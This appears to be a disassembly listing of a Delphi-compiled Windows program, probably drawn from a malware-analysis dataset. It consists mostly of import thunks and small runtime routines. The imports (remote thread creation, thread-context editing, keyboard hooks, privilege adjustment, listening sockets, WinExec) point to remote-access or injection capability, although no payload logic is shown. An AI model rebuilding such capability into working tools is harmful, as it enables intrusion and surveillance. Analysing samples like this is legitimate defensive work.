jmp sub_4070f4
sub_401244
jmp [ rw-data ]
sub_40124c
jmp [ rw-data ]
GetFileType
jmp [ GetFileType@IAT ]
sub_40125c
jmp [ rw-data ]
sub_401274
jmp [ rw-data ]
sub_401284
jmp [ rw-data ]
sub_4012ac
jmp [ rw-data ]
sub_4012b4
jmp [ rw-data ]
sub_4012bc
jmp [ rw-data ]
sub_4012c4
jmp [ rw-data ]
sub_4012cc
jmp [ rw-data ]
sub_4012d4
jmp [ rw-data ]
sub_4012dc
jmp [ rw-data ]
sub_4012e4
jmp [ rw-data ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_4012f4
jmp [ rw-data ]
sub_4012fc
jmp [ rw-data ]
sub_401304
jmp [ rw-data ]
sub_40130c
jmp [ rw-data ]
sub_401314
jmp [ rw-data ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_401324
jmp [ rw-data ]
sub_401334
jmp [ rw-data ]
sub_40134c
jmp [ rw-data ]
sub_401354
jmp [ rw-data ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_401374
jmp [ rw-data ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
sub_40138c
jmp [ rw-data ]
sub_401394
jmp [ rw-data ]
sub_40139c
jmp [ rw-data ]
sub_4013a4
jmp [ rw-data ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
sub_4013b4
jmp [ rw-data ]
sub_4013bc
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_4013f8
jmp [ rw-data ]
sub_401468
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] eax
retn
sub_40147c
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] eax
retn
sub_4014c8
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
mov ecx [ eax + 0x20 ]
mov [ edx + 0x20 ] ecx
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_4016f6
retn
sub_402fa4
call sub_407688
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_407688
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_402ff8
mov [ rw-data ] edx
call sub_405464
sub_403078
retn
sub_40308c
call sub_4012f4
call sub_40307c
retn
sub_4030d8
retn
sub_4030dc
push ebx
call sub_407688
mov ebx [ eax + 0x4 ]
call sub_407688
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_403349
jmp sub_404de4
sub_403350
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4033e0
push ebx
xor ebx ebx
imul edx [ ebx + rw-data ] 0x8088405
inc edx
mov [ ebx + rw-data ] edx
mul edx
mov eax edx
pop ebx
retn
sub_403408
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_403418
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_4034f4
mov dx 0xd7b1
call sub_40349c
retn
sub_403500
mov dx 0xd7b2
call sub_40349c
retn
sub_40350c
mov dx 0xd7b3
call sub_40349c
retn
sub_403594
push ebx
mov ebx eax
push ebx
call sub_401244
dec eax
sete al
pop ebx
retn
sub_40376f
retn
sub_403820
mov edx [ eax + 0x1c ]
call sub_4037d8
retn
sub_40382c
mov edx [ eax + 0x20 ]
call sub_4037d8
retn
sub_403838
jmp [ rw-data ]
sub_403840
jmp [ rw-data ]
sub_4038d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0xd7b1
push sub_403838
push 0x64
call sub_403848
pop ebx
pop ebp
retn 0x4
sub_4038f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0xd7b2
push sub_403840
push 0x65
call sub_403848
pop ebx
pop ebp
retn 0x4
sub_40399f
retn
sub_4039a0
movzx ecx [ edx ]
inc ecx
xchg edx eax
call sub_4030fc
retn
sub_403e68
movzx ecx [ rw-data ]
and cl 0x3
cmp cl 0x2
jbe r-xdata
movzx ecx cl
call sub_403d88
retn
mov cl 0x2
sub_403e84
mov ecx 0x3
call sub_403d88
retn
sub_403ec3
retn
sub_4040f4
mov ecx 0xff
call sub_404100
retn
j_sub_40412c
jmp sub_40412c
sub_404129
retn
sub_4044b9
jmp sub_404de4
sub_40450c
fninit
fwait
fldcw [ rw-data ]
retn
sub_4045cb
jmp sub_404de4
sub_4045d2
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4045dc
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4045e8
push ebx
mov ebx eax
mov eax ebx
call sub_404618
call sub_402f00
mov edx eax
mov eax ebx
call sub_40465c
pop ebx
retn
sub_404604
push ebx
mov ebx eax
mov eax ebx
call sub_4046b4
mov eax ebx
call sub_402f1c
pop ebx
retn
sub_404618
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_404640
call sub_404a1c
test dl dl
jle r-xdata
retn
call sub_4049c4
sub_404700
retn
sub_404788
jmp sub_404de4
sub_40478f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_404898
mov eax 0x8000ffff
retn
sub_4048a0
retn
sub_4048a4
retn
sub_4048a8
retn
sub_40499d
jmp sub_404b30
sub_4049a2
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_404eec
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4049c4
sub_4049c4
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4049fb
jmp sub_404b30
sub_404a1c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_404a2c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_404af4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_404b10
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_404e69
call sub_407688
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ecx + 0x8 ]
jmp sub_404650
sub_404f85
retn
sub_4050c8
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_405159
jmp sub_404b30
j_sub_404b30#6
jmp sub_404b30
sub_4051dc
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_4050c8
mov [ rw-data ] 0x0
call sub_405174
retn
sub_4052f9
retn
sub_40545f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_405464
mov [ rw-data ] eax
call sub_405388
sub_405514
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call sub_4012bc
pop ebx
retn
mov eax ebx
call [ rw-data ]
sub_405754
retn
sub_405790
retn
sub_40579e
retn
sub_4057b7
retn
sub_4057d0
retn
sub_4057e4
retn
sub_4058de
retn
sub_405970
retn
j_sub_4059f0#2
jmp sub_4059f0
sub_405a39
retn
sub_405a41
retn
sub_405a83
retn
sub_405cf7
retn
sub_405d00
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_403050
sub_405d18
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_40138c
sub_405e68
retn
sub_405ea4
retn
sub_405eb6
retn
sub_405eb8
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4060e0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_403050
call [ rw-data ]
retn
sub_4061e4
mov ecx 0x1
jmp sub_4060f8
sub_4061ee
retn
sub_4061f0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_403050
call [ rw-data ]
retn
sub_406418
retn
sub_40641c
push eax
call sub_4061e4
pop eax
call sub_402f1c
retn
sub_40642c
call sub_406434
retn
sub_406434
xchg edx eax
call sub_405758
retn
sub_40643c
xchg ecx eax
xchg edx ecx
call sub_40568c
retn
sub_4064bf
retn
sub_406551
retn
sub_40677c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_406324
pop ebp
retn 0x4
j_sub_4060f8
jmp sub_4060f8
sub_406791
retn
sub_406794
call sub_406934
retn
sub_4069c0
call sub_406998
retn
sub_406d31
jmp sub_404de4
sub_406e9c
call sub_406eac
retn
sub_406ea4
call sub_406ecc
retn
sub_406eac
push ebx
mov ebx eax
mov eax 0x8
call sub_402f00
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_406f6b
jmp sub_404b30
sub_406f8c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_407000
jmp sub_404de4
sub_407007
pop ecx
pop ebp
retn
sub_407080
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_40708c
add eax 0x4
push eax
call sub_40139c
retn
sub_407098
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_403050
sub_4070a8
call sub_4045e8
mov [ eax + 0x4 ] 0x1
retn
sub_4070e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_401394
pop ebp
retn 0x4
sub_407138
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call [ rw-data ]
pop ebp
retn
sub_407148
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
call [ rw-data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_407438
jmp sub_404de4
sub_40743f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4074f3
jmp sub_404de4
sub_4074fa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407543
jmp sub_404de4
sub_40754a
pop esi
pop ebx
pop ecx
pop ebp
retn
GetACP
jmp [ GetACP@IAT ]
sub_407604
jmp sub_404de4
sub_40760b
pop ebp
retn
sub_407610
jmp [ rw-data ]
sub_407618
jmp [ rw-data ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_407630
push eax
push 0x40
call sub_407618
retn
sub_40763c
mov eax 0x38
retn
sub_4076c8
mov eax rw-data
call sub_406f8c
retn
sub_407718
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_407734
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_40773c
push ecx
mov edx eax
and dx 0xffff
mov [ esp ] dx
shr eax 0x10
mov [ esp + 0x2 ] ax
mov eax [ esp ]
pop edx
retn
AdjustTokenPrivileges
jmp [ AdjustTokenPrivileges@IAT ]
GetCurrentHwProfileA
jmp [ GetCurrentHwProfileA@IAT ]
GetSidIdentifierAuthority
jmp [ GetSidIdentifierAuthority@IAT ]
GetSidSubAuthority
jmp [ GetSidSubAuthority@IAT ]
GetSidSubAuthorityCount
jmp [ GetSidSubAuthorityCount@IAT ]
GetUserNameA
jmp [ GetUserNameA@IAT ]
IsValidSid
jmp [ IsValidSid@IAT ]
LookupPrivilegeDisplayNameA
jmp [ LookupPrivilegeDisplayNameA@IAT ]
LookupPrivilegeNameA
jmp [ LookupPrivilegeNameA@IAT ]
LookupPrivilegeValueA
jmp [ LookupPrivilegeValueA@IAT ]
OpenProcessToken
jmp [ OpenProcessToken@IAT ]
OpenThreadToken
jmp [ OpenThreadToken@IAT ]
RegCreateKeyA
jmp [ RegCreateKeyA@IAT ]
RegDeleteKeyA
jmp [ RegDeleteKeyA@IAT ]
RegDeleteValueA
jmp [ RegDeleteValueA@IAT ]
RegEnumKeyExA
jmp [ RegEnumKeyExA@IAT ]
RegEnumValueA
jmp [ RegEnumValueA@IAT ]
RegFlushKey
jmp [ RegFlushKey@IAT ]
RegOpenKeyA
jmp [ RegOpenKeyA@IAT ]
RegQueryInfoKeyA
jmp [ RegQueryInfoKeyA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
RegSetValueExA
jmp [ RegSetValueExA@IAT ]
Beep
jmp [ Beep@IAT ]
CreateDirectoryA
jmp [ CreateDirectoryA@IAT ]
__imp_CreateFileA
jmp [ CreateFileA@IAT ]
CreateFileMappingA
jmp [ CreateFileMappingA@IAT ]
CreateMutexA
jmp [ CreateMutexA@IAT ]
CreateProcessA
jmp [ CreateProcessA@IAT ]
CreateRemoteThread
jmp [ CreateRemoteThread@IAT ]
DosDateTimeToFileTime
jmp [ DosDateTimeToFileTime@IAT ]
EnumResourceNamesA
jmp [ EnumResourceNamesA@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FileTimeToSystemTime
jmp [ FileTimeToSystemTime@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
__imp_FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetDriveTypeA
jmp [ GetDriveTypeA@IAT ]
GetEnvironmentVariableA
jmp [ GetEnvironmentVariableA@IAT ]
GetExitCodeProcess
jmp [ GetExitCodeProcess@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFileTime
jmp [ GetFileTime@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetSystemDirectoryA
jmp [ GetSystemDirectoryA@IAT ]
GetSystemPowerStatus
jmp [ GetSystemPowerStatus@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetThreadContext
jmp [ GetThreadContext@IAT ]
GetUserDefaultLangID
jmp [ GetUserDefaultLangID@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GetVolumeInformationA
jmp [ GetVolumeInformationA@IAT ]
GetWindowsDirectoryA
jmp [ GetWindowsDirectoryA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalMemoryStatus
jmp [ GlobalMemoryStatus@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
IsBadReadPtr
jmp [ IsBadReadPtr@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LocalFileTimeToFileTime
jmp [ LocalFileTimeToFileTime@IAT ]
LockResource
jmp [ LockResource@IAT ]
MapViewOfFile
jmp [ MapViewOfFile@IAT ]
MoveFileA
jmp [ MoveFileA@IAT ]
OpenProcess
jmp [ OpenProcess@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ReadProcessMemory
jmp [ ReadProcessMemory@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetFileTime
jmp [ SetFileTime@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
SetThreadContext
jmp [ SetThreadContext@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SetThreadPriority
jmp [ SetThreadPriority@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_407cb8
jmp [ rw-data ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
UnmapViewOfFile
jmp [ UnmapViewOfFile@IAT ]
VerLanguageNameA
jmp [ VerLanguageNameA@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualFreeEx
jmp [ VirtualFreeEx@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForMultipleObjectsEx
jmp [ WaitForMultipleObjectsEx@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WinExec
jmp [ WinExec@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDCA
jmp [ CreateDCA@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GdiFlush
jmp [ GdiFlush@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetRgnBox
jmp [ GetRgnBox@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextMetricsA
jmp [ GetTextMetricsA@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CloseClipboard
jmp [ CloseClipboard@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DispatchMessageW
jmp [ DispatchMessageW@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EmptyClipboard
jmp [ EmptyClipboard@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumChildWindows
jmp [ EnumChildWindows@IAT ]
EnumDisplayDevicesA
jmp [ EnumDisplayDevicesA@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
ExitWindowsEx
jmp [ ExitWindowsEx@IAT ]
GetClassInfoA
jmp [ GetClassInfoA@IAT ]
GetClassLongA
jmp [ GetClassLongA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardLayoutNameA
jmp [ GetKeyboardLayoutNameA@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetLastInputInfo
jmp [ GetLastInputInfo@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
GetMessageA
jmp [ GetMessageA@IAT ]
GetMessagePos
jmp [ GetMessagePos@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
GetWindowTextLengthA
jmp [ GetWindowTextLengthA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InflateRect
jmp [ InflateRect@IAT ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsClipboardFormatAvailable
jmp [ IsClipboardFormatAvailable@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsDialogMessageW
jmp [ IsDialogMessageW@IAT ]
IsIconic
jmp [ IsIconic@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowUnicode
jmp [ IsWindowUnicode@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
LockWorkStation
jmp [ LockWorkStation@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
MsgWaitForMultipleObjectsEx
jmp [ MsgWaitForMultipleObjectsEx@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
__imp_OemToCharA
jmp [ OemToCharA@IAT ]
OpenClipboard
jmp [ OpenClipboard@IAT ]
PeekMessageW
jmp [ PeekMessageW@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
__imp_SendMessageA
jmp [ SendMessageA@IAT ]
SendMessageW
jmp [ SendMessageW@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetCursorPos
jmp [ SetCursorPos@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
ToAscii
jmp [ ToAscii@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_408568
movzx ecx cl
call sub_403af4
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_408707
jmp sub_404de4
sub_40870e
pop ebp
retn
sub_408738
xor edx edx
mov [ eax ] edx
retn
accept
jmp [ accept@IAT ]
bind
jmp [ bind@IAT ]
connect
jmp [ connect@IAT ]
getsockname
jmp [ getsockname@IAT ]
htons
jmp [ htons@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
ioctlsocket
jmp [ ioctlsocket@IAT ]
listen
jmp [ listen@IAT ]
ntohs
jmp [ ntohs@IAT ]
select
jmp [ select@IAT ]
sendto
jmp [ sendto@IAT ]
socket
jmp [ socket@IAT ]
gethostbyaddr
jmp [ gethostbyaddr@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
getservbyname
jmp [ getservbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
sub_409651
add eax 0xffffffd4
jmp sub_40f8dc
sub_409659
add eax 0xffffffd4
jmp sub_40f770
sub_409661
add eax 0xffffffd4
jmp sub_40f81c
sub_409669
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4070b8
sub_409673
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4070e0
sub_40967d
